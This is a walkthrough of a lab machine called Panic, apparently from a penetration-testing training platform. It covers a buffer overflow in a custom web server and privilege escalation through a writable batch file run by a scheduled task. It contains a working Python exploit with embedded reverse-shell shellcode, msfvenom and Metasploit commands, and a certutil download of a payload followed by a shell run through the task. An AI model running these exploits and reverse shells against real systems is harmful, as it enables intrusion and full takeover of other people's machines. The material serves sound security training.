@@ -1,0 +1,411 @@
+Exploitation Guide for Panic
+Summary
+In this walkthrough, we will exploit the target through a buffer overflow vulnerability in a custom web server. We’ll be able to escalate our privileges by modifying a writable batch script that gets run by an elevated Scheduled Task.
+
+Enumeration
+Nmap
+We’ll begin with an nmap scan against all TCP ports.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -T4 -p- 192.168.120.144
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 08:11 EDT
+Nmap scan report for 192.168.120.144
+Host is up (0.032s latency).
+Not shown: 65427 closed ports, 94 filtered ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+27015/tcp open  unknown
+47001/tcp open  winrm
+...
+We see several services running on the target. We’ll focus on the FTP service on port 21 and the unknown service on port 27015. Making a raw connection to the service on port 27015, we receive only the message Huh? back.
+
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.120.144 27015
+
+Huh?
+
+┌──(kali㉿kali)-[~]
+└─$
+Let’s try a more detailed scan.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -T4 -sC -sV -p 21,27015 192.168.120.144
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-21 08:14 EDT
+Nmap scan report for 192.168.120.144
+Host is up (0.030s latency).
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     FileZilla ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 AppData
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Application Data
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Contacts
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Cookies
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Desktop
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Favorites
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Links
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Local Settings
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Music
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Documents
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 NetHood
+| -r--r--r-- 1 ftp ftp         786432 Jun 21 04:59 NTUSER.DAT
+| -r--r--r-- 1 ftp ftp         258048 Dec 01  2020 ntuser.dat.LOG1
+| -r--r--r-- 1 ftp ftp              0 Dec 01  2020 ntuser.dat.LOG2
+| -r--r--r-- 1 ftp ftp          65536 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TM.blf
+| -r--r--r-- 1 ftp ftp         524288 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TMContainer00000000000000000001.regtrans-ms
+| -r--r--r-- 1 ftp ftp         524288 Dec 01  2020 NTUSER.DAT{ead35664-3356-11eb-b87c-e1e29d69919f}.TMContainer00000000000000000002.regtrans-ms
+| -r--r--r-- 1 ftp ftp             20 Dec 01  2020 ntuser.ini
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Pictures
+| drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 PrintHood
+|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+27015/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|     Huh?
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Epic/1.0
+|     Content-Length: 67
+|     Content-Type: text/html; charset=utf-8
+|_    <html><body>Epic HTTP Server :: 1.0 :: Invulnerable</body></html>
+The FTP server allows anonymous logins. The service on port 27015 still registers as unknown, but it does leak some HTTP content: Epic HTTP Server :: 1.0 :: Invulnerable. Let’s investigate the web service further.
+
+Curl
+Visiting the default page in a web browser doesn’t give us any more information.
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.144:27015 
+<html><body>Epic HTTP Server ::  1.0 :: Invulnerable</body></html>
+Let’s try a blank POST request next.
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://192.168.120.144:27015
+<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>
+The web server seems to caution us not to send large payloads. Specifically, it points out the maximum payload size of 512 bytes. This is rather odd, and it hints at a potential buffer overflow vulnerability in the application.
+
+Anonymous FTP Enumeration
+Next, let’s connect to the anonymous FTP service.
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.120.144
+Connected to 192.168.120.144.
+220-FileZilla Server 0.9.60 beta
+220-written by Tim Kosse (tim.kosse@filezilla-project.org)
+220 Please visit https://filezilla-project.org/
+Name (192.168.120.144:kali): anonymous
+331 Password required for anonymous
+Password:
+230 Logged on
+Remote system type is UNIX.
+ftp> ls
+200 Port command successful
+150 Opening data channel for directory listing of "/"
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 AppData
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Application Data
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Contacts
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Cookies
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Desktop
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Documents
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 Downloads
+...
+226 Successfully transferred "/"
+While enumerating FTP directories, we find a Windows executable file panic.exe inside the Documents folder. We’ll also note the presence of a shortcut file EMET GUI.lnk here.
+
+ftp> cd Documents
+250 CWD successful. "/Documents" is current directory.
+ftp> ls
+200 Port command successful
+150 Opening data channel for directory listing of "/Documents"
+-r--r--r-- 1 ftp ftp            402 Dec 01  2020 desktop.ini
+-r--r--r-- 1 ftp ftp           1930 Dec 01  2020 EMET GUI.lnk
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Music
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Pictures
+drwxr-xr-x 1 ftp ftp              0 Dec 01  2020 My Videos
+-r-xr-xr-x 1 ftp ftp          46636 Dec 01  2020 panic.exe
+226 Successfully transferred "/Documents"
+We’ll download this binary to our attacking machine for closer inspection.
+
+ftp> get panic.exe
+local: panic.exe remote: panic.exe
+200 Port command successful
+150 Opening data channel for file download from server of "/Documents/panic.exe"
+WARNING! 114 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Successfully transferred "/Documents/panic.exe"
+46636 bytes received in 0.07 secs (660.8571 kB/s)
+ftp> quit
+221 Goodbye
+
+┌──(kali㉿kali)-[~]
+└─$
+Exploitation
+Buffer Overflow Exploit Development
+We can create a Windows virtual machine by downloading an image from the Microsoft Evaluation Center.
+
+While testing the binary on a local Windows installation, we confirm that this is the same server that is running on the target port 27015. The full exploit development process is beyond the scope of this walkthrough, but we will cover the most important points.
+
+After conducting a quick search about the EMET GUI.lnk shortcut file, we find that the software is Enhanced Mitigation Experience Toolkit. It’s a tool developed by Microsoft that can help disable common mitigations like DEP or ASLR. This is usually applied on servers to increase the compatibility of older software running on recent versions of Windows.
+
+To debug more effectively, we’ll install the EMET tool on our Windows debugging machine and disable the protection mechanisms for this binary.
+
+EMET
+
+We’ll also install a debugger of our choice, such as Immunity Debugger, to develop our exploit. During the debugging process, we discover that the server is indeed vulnerable to buffer overflow exploitation with a POST request larger than 512 bytes.
+
+To test this, we will attach our debugger to the running server process and resume execution. We’ll then issue a large POST request to the server.
+
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST --data "test=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" http://192.168.120.144:27015
+...
+The server crashes, and the EIP register is overwritten with all A’s (0x41).
+
+BoF
+
+Having full control of the EIP register, we can continue with exploit development. The next important detail is the handling of “bad characters” in our payload that would mangle the input to the vulnerable application. We discover that the following three characters should be avoided: 0x00, 0x0a, and 0x0d.
+
+Now we need to find a JMP ESP instruction that we can use to redirect execution flow to our malicious buffer. Fortunately for us, the binary itself contains such an instruction at the address 77701463.
+
+JMP_ESP
+
+This is perfect for our exploit development process as we can develop a universal exploit that should work on all versions of Windows.
+
+Choosing a Payload
+After testing the size of the allocated buffer that is available to us, we are limited to only about 340 bytes. That is not enough space for a self-contained, un-staged reverse shell payload. Let’s check how small we can get a staged reverse shell payload to be.
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b '\x00\x0a\x0d' -f python --smallest
+Found 11 compatible encoders
+...
+Attempting to encode payload with 1 iterations of x86/fnstenv_mov
+x86/fnstenv_mov succeeded with size 318 (iteration=0)
+...
+x86/fnstenv_mov chosen with final size 318
+Payload size: 318 bytes
+Final size of python file: 1558 bytes
+buf =  b""
+buf += b"\x6a\x4a\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
+buf += b"\x1a\x32\x97\x21\x83\xeb\xfc\xe2\xf4\xe6\xda\x18\x21"
+Looks like the staged TCP reverse shell payload using the x86/fnstenv_mov encoder takes only 318 bytes, which is within our restrictive parameters. We’ll prepend a few NOP instructions to the beginning of this payload. That gives us the following PoC script.
+
+#!/usr/bin/python3
+
+import socket
+import sys
+
+def main(argv):
+    ip = argv[0]
+
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip, 27015))
+
+    buf  = b"\x90\x90\x90\x90\x90\x90\x90\x90"
+    buf += b"\x6a\x4a\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
+    buf += b"\x1a\x32\x97\x21\x83\xeb\xfc\xe2\xf4\xe6\xda\x18\x21"
+    buf += b"\x1a\x32\xf7\x10\xc8\xbb\x72\x45\x91\x60\xa7\xaa\x48"
+    buf += b"\x3e\x1c\x73\x0e\x3d\x20\x6b\x3c\xb9\xe5\x09\x2b\xcd"
+    buf += b"\xa6\xe1\xb6\x0e\xf6\x5d\x18\x1e\xb7\xe0\xd5\x3f\x96"
+    buf += b"\xe6\x53\x47\x78\x73\x4d\xb9\xc5\x31\x91\x70\xab\x20"
+    buf += b"\xca\xb9\xd7\x59\x9f\xf2\xe3\x6d\x1b\xe2\xc7\xaa\x42"
+    buf += b"\x12\x1c\x69\x02\x33\x44\xa4\xd3\x46\xab\x10\xe5\x7b"
+    buf += b"\x1c\x15\x91\x33\x41\x10\xda\x9e\x56\xee\x17\x33\x50"
+    buf += b"\x19\xfa\x47\x63\x22\x67\xca\xac\x5c\x3e\x47\x77\x79"
+    buf += b"\x91\x6a\xb3\x20\xc9\x54\x1c\x2d\x51\xb9\xcf\x3d\x1b"
+    buf += b"\xe1\x1c\x25\x91\x33\x47\xa8\x5e\x16\xb3\x7a\x41\x53"
+    buf += b"\xce\x7b\x4b\xcd\x77\x79\x45\x68\x1c\x33\xf3\xb2\x68"
+    buf += b"\xde\xe5\x6f\xff\x12\x28\x32\x97\x49\x6d\x41\xa5\x7e"
+    buf += b"\x4e\x5a\xdb\x56\x3c\x35\x1e\xc9\xe5\xe2\x2f\xb1\x1b"
+    buf += b"\x32\x97\x08\xde\x66\xc7\x49\x33\xb2\xfc\x21\xe5\xe7"
+    buf += b"\xfd\x2b\x72\xf2\x3f\x57\x1f\x5a\x95\x21\x1b\x89\x1e"
+    buf += b"\xc7\x4a\x62\xc7\x71\x5a\x62\xd7\x71\x72\xd8\x98\xfe"
+    buf += b"\xfa\xcd\x42\xb6\x70\x22\xc1\x76\x72\xab\x32\x55\x7b"
+    buf += b"\xcd\x42\xa4\xda\x46\x9b\xde\x54\x3a\xe2\xcd\x72\xc2"
+    buf += b"\x22\x83\x4c\xcd\x42\x4b\x1a\x58\x93\x77\x4d\x5a\x95"
+    buf += b"\xf8\xd2\x6d\x68\xf4\x91\x04\xfd\x61\x72\x32\x87\x21"
+    buf += b"\x1a\x64\xfd\x21\x72\x6a\x33\x72\xff\xcd\x42\xb2\x49"
+    buf += b"\x58\x97\x77\x49\x65\xff\x23\xc3\xfa\xc8\xde\xcf\x33"
+    buf += b"\x54\x08\xdc\x47\x79\xe2"
+
+    junk = b"A" * 145
+    eip = b"\x63\x14\x70\x77"
+
+    s.send("POST / HTTP/1.1\n\r".encode() + junk + eip + buf)
+    print(s.recv(1024))
+    s.close
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"[*] Usage: {sys.argv[0]} <TARGET IP>")
+        sys.exit(1)
+    main(sys.argv[1:])
+Let’s start a Metasploit multi-handler to catch the staged reverse shell.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole
+...
+msf6 > use exploit/multi/handler 
+...
+msf6 exploit(multi/handler) >
+...
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.118.5    yes       The listen address (an interface may be specified)
+   LPORT     443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+With the necessary parameters set, we can start the listener.
+
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.118.5:443
+...
+Let’s execute our exploit.
+
+┌──(kali㉿kali)-[~]
+└─$ python3 exploit.py 192.168.120.144
+b'HTTP/1.1 200 OK\r\nServer: Epic/1.0\r\nContent-Length: 113\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html><body>Epic HTTP Server :: Please make sure that the post request is not bigger than 512 bytes</body></html>\n\x00\xb7uwP\xcb\x12t\x00\x00\x00\x00\x00\x00\x00\x00\x00`/\x000H\x0f\x00\xec\xeb\x82w\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00)\xcc\x9bH\xd4\xfb\xd9\x00\x00\x00\x00\x00\xf8\xfc\xd9\x00pnyw\xfdB\xc3?\xfe\xff\xff\xffL\x07yw\x9b}xw\x95\xcd\x9bH\x00\x00\x00\x00\x00\x00\x00\x00$\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00rw\x00\x00\x00\x00$\xfd\xd9\x00\x00`/\x00\x00\x00\x00\x00\xbc\xfc\xd9\x00\x00\x00\x00\x00\xff\xff\xff\xffpnyw\xbc\xf0xw\xea|xw$\xfd\xd9\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\xfd\xd9\x00\x00\x00rw\x00\x00\x00\x00?\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7f\x02\x00\x00\x00\x00\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+After the malicious buffer is received by the server, our listener should catch the reverse shell
+
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.118.5:443 
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 192.168.120.144
+[*] Command shell session 1 opened (192.168.118.5:443 -> 192.168.120.144:49937) at 2021-06-21 13:00:20 -0400
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\eugene\Documents>whoami
+whoami
+panic\eugene
+Escalation
+Local Enumeration
+While enumerating the user’s home folders, we find an interesting Windows batch file ping.bat in the Downloads folder.
+
+C:\Users\eugene\Documents>cd ..
+cd ..
+
+C:\Users\eugene>cd Downloads
+cd Downloads
+
+C:\Users\eugene\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1A83-F70D
+
+ Directory of C:\Users\eugene\Downloads
+
+12/01/2020  07:27 PM    <DIR>          .
+12/01/2020  07:27 PM    <DIR>          ..
+12/01/2020  07:30 PM               230 ping.bat
+               1 File(s)            230 bytes
+               2 Dir(s)  14,912,065,536 bytes free
+Let’s examine its contents.
+
+C:\Users\eugene\Downloads>type ping.bat
+type ping.bat
+@echo off
+set MyServer=Server.Local
+%SystemRoot%\system32\ping.exe -n 1 %MyServer% >nul
+if errorlevel 1 goto NoServer
+
+echo %MyServer% is available.
+goto :EOF
+
+:noServer
+echo %MyServer% is not available.
+pause
+goto :EOF
+This script seems to ping a local server, and it looks like something that is run on a schedule. Let’s see if there is a Scheduled Task that runs the script.
+
+C:\Users\eugene\Downloads>schtasks | FIND "ping"        
+schtasks | FIND "ping"
+
+C:\Users\eugene\Downloads>
+This query doesn’t return anything, but it is possible the task is running from a privileged account.
+
+Exploiting Administrative Scheduled Task
+Since the script is in our home directory, and we are able to write to it, we should be able to inject a reverse shell. Let’s start by creating the payload.
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.5 LPORT=445 -f exe > shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+We’ll host it over HTTP with a python web server.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 80                                                        
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+Next, let’s download the payload to the target.
+
+C:\Users\eugene\Downloads>certutil -f -urlcache http://192.168.118.5/shell.exe shell.exe
+certutil -f -urlcache http://192.168.118.5/shell.exe shell.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\eugene\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1A83-F70D
+
+ Directory of C:\Users\eugene\Downloads
+
+06/21/2021  10:22 AM    <DIR>          .
+06/21/2021  10:22 AM    <DIR>          ..
+12/01/2020  07:30 PM               230 ping.bat
+06/21/2021  10:22 AM            73,802 shell.exe
+               2 File(s)         74,032 bytes
+               2 Dir(s)  15,594,913,792 bytes free
+We’ll start a listener to catch the reverse shell if the batch script gets run.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvp 445
+listening on [any] 445 ...
+Finally, we’ll replace the content of the batch file with a single call to our shell.
+
+C:\Users\eugene\Downloads>echo shell.exe > ping.bat
+echo shell.exe > ping.bat
+
+C:\Users\eugene\Downloads>type ping.bat
+type ping.bat
+shell.exe 
+
+C:\Users\eugene\Downloads>
+We’ll now wait for a bit. After a couple of minutes, an administrative Scheduled Task indeed kicks off the script, and we catch our reverse shell.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvp 445
+listening on [any] 445 ...
+192.168.120.144: inverse host lookup failed: Unknown host
+connect to [192.168.118.5] from (UNKNOWN) [192.168.120.144] 57226
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\eugene\Downloads>whoami
+whoami
+panic\administrator
